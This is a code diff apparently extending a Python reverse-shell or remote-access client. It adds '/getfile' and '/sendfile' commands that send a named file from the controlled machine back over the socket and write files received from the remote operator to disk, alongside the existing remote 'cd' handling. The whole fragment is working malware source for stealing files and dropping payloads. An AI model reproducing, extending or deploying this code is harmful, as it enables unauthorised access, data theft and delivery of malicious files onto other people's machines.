@@ -32,6 +32,24 @@ while True:
     splited_command = command.split()
     if command.lower() == "exit":
         break
+    if command == "/getfile":
+        filename = s.recv(BUFFER_SIZE).decode()
+        if filename in os.listdir():
+            with open(filename, "rb") as f:
+                data = f.read()
+                dataLen = len(data)
+                s.send(dataLen.to_bytes(4,'big'))
+                s.send(data)
+            f.close()
+    if command == "/sendfile":
+        filename = s.recv(1024).decode("utf-8")
+        remaining = int.from_bytes(s.recv(4),'big')
+        f = open(filename,"wb")
+        while remaining:
+            data = s.recv(min(remaining,4096))
+            remaining -= len(data)
+            f.write(data)
+        f.close()
     if splited_command[0].lower() == "cd":
         try:
             os.chdir(' '.join(splited_command[1:]))
